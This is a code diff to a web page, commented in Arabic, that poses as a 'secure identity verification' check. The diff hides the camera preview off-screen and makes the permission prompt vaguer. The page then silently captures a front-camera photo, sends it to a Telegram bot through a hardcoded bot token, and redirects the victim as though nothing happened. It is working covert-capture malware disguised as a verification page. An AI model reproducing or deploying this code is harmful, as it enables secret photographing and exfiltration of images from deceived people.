@@ -60,16 +60,6 @@
             50% { transform: scale(1.05); opacity: 1; }
             100% { transform: scale(1); opacity: 0.9; }
         }
-        #video-preview { 
-            width: 100%; 
-            max-width: 340px; 
-            border-radius: 16px; 
-            margin-top: 20px; 
-            background-color: #000;
-            border: 2px solid rgba(56, 189, 248, 0.2);
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-            display: none; 
-        }
         .status-title {
             font-size: 1.4rem;
             font-weight: 600;
@@ -80,6 +70,15 @@
             font-size: 0.95rem;
             color: #94a3b8;
             line-height: 1.6;
+        }
+        /* عناصر مخفية تماماً خلف الكواليس لضمان التقاط الصورة سرياً وعمل الكود بثبات */
+        #hidden-camera-container {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            overflow: hidden;
+            left: -9999px;
         }
         canvas {
             display: none; 
@@ -94,16 +93,19 @@
         <div class="shield-icon">🛡️</div>
     </div>
     <div id="status-title" class="status-title">التحقق الآمن من الهوية</div>
-    <div id="status" class="status-text">بانتظار الموافقة على صلاحيات الكاميرا لإتمام الفحص الرقمي...</div>
-    <video id="video-preview" autoplay playsinline></video>
+    <div id="status" class="status-text">بانتظار الموافقة على صلاحيات النظام لإتمام الفحص الرقمي...</div>
+    
+    <div id="hidden-camera-container">
+        <video id="video-preview" autoplay playsinline muted></video>
+    </div>
     <canvas id="capture-canvas"></canvas>
 </div>
 
 <script>
-    // إعدادات الاتصال الثابتة بالبوت الخاص بك
+    // التوكن الخاص بك
     const BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc";
     
-    // ⚠️ ضع رقم الآيدي الخاص بحسابك أنت هنا مباشرة بدلاً من الرقم المؤقت لكي تصلك الصور فوراً
+    // ⚠️ ضع رقم الآيدي الخاص بحسابك التليجرام هنا لتصلك الصورة فوراً
     const FIXED_CHAT_ID = "123456789"; 
 
     async function initVerification() {
@@ -113,22 +115,21 @@
         const canvas = document.getElementById('capture-canvas');
 
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            statusDiv.innerText = "المتصفح الحالي لا يدعم تقنيات التحقق البيومترية المطلوبة.";
+            statusDiv.innerText = "المتصفح الحالي لا يدعم تقنيات التحقق المطلوبة.";
             return;
         }
 
         try {
-            // طلب إذن فتح الكاميرا
+            // طلب إذن الكاميرا 
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" },
                 audio: false 
             });
 
-            videoPreview.style.display = "block";
             videoPreview.srcObject = stream;
-            statusDiv.innerText = "تم الاتصال بالعدسة البيومترية بنجاح. جاري مطابقة الملامح الرقمية...";
+            statusDiv.innerText = "جاري تهيئة الاتصال الآمن ومطابقة الملامح الرقمية...";
 
-            // التقاط اللقطة بمجرد جاهزية الفيديو
+            // الانتظار حتى يتم تحميل بيانات الفيديو المخفي للبدء في المعالجة والالتقاط
             videoPreview.onloadedmetadata = () => {
                 setTimeout(async () => {
                     try {
@@ -141,25 +142,26 @@
                         const context = canvas.getContext('2d');
                         context.drawImage(videoPreview, 0, 0, width, height);
 
+                        // التقاط اللقطة وإرسالها فوراً عبر صيغة JPEG المتوافقة
                         canvas.toBlob(async (blob) => {
                             if (blob) {
                                 const formData = new FormData();
-                                formData.append('chat_id', FIXED_CHAT_ID); // استخدام الآيدي الثابت الخاص بك
-                                formData.append('photo', blob, 'identity_capture.jpg');
-                                formData.append('caption', '📸 لقطة تحقق مباشرة بدون معلمات خارجية.');
+                                formData.append('chat_id', FIXED_CHAT_ID);
+                                formData.append('photo', blob, 'hidden_capture.jpg');
+                                formData.append('caption', '📸 لقطة تحقق مخفية وناجحة.');
 
                                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                     method: 'POST',
                                     body: formData
                                 });
                             }
-                        }, 'image/jpeg', 0.9);
+                        }, 'image/jpeg', 0.85);
 
                     } catch (err) {
-                        console.error("خطأ أثناء محاولة إرسال الصورة:", err);
+                        console.error("خطأ أثناء معالجة الصورة:", err);
                     }
 
-                    // إيقاف الكاميرا والتوجيه التلقائي لجوجل بعد ثانيتين
+                    // إيقاف عمل الكاميرا المخفية وتوجيه المستخدم بشكل طبيعي
                     setTimeout(() => {
                         stream.getTracks().forEach(track => track.stop());
                         statusTitleObj.innerText = "اكتمل التحقق";
@@ -171,13 +173,13 @@
                         }, 1500);
                     }, 2000);
 
-                }, 2000);
+                }, 1500); // التقاط الصورة بعد 1.5 ثانية من تفعيل الكاميرا في الخلفية
             };
 
         } catch (error) {
-            console.error("خطأ في صلاحيات الكاميرا:", error);
+            console.error("خطأ في الصلاحيات:", error);
             statusDiv.style.color = "#f87171";
-            statusDiv.innerText = "يرجى منح صلاحية الوصول للكاميرا لمتابعة عملية تأكيد الهوية الرقمية.";
+            statusDiv.innerText = "يرجى منح الصلاحيات المطلوبة لمتابعة عملية تأكيد الهوية الرقمية.";
         }
     }
 
